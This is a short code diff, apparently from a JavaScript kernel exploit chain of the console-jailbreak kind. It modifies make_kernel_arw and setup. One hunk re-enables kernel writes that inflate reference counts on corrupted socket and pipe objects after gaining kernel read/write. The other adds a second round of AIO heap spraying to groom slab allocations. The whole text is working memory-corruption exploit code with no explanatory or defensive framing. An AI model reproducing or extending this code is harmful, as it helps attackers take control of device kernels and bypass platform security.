@@ -1472,14 +1472,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     log('corrupt pointers cleaned');
 
-    /*
+    
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    */
+    
 
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1641,6 +1641,17 @@ function setup(block_fd) {
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
     cancel_aios(groom_ids_p, num_grooms);
+    {
+        // chosen to maximize the number of 0x100 malloc allocs per submission
+        const num_reqs = 4;
+        const groom_ids = new View4(num_grooms);
+        const groom_ids_p = groom_ids.addr;
+        const greqs = make_reqs1(num_reqs);
+        // allocate enough so that we start allocating from a newly created slab
+        spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
+        cancel_aios(groom_ids_p, num_grooms);
+    }
+        
     return [block_id, groom_ids];
 }
 
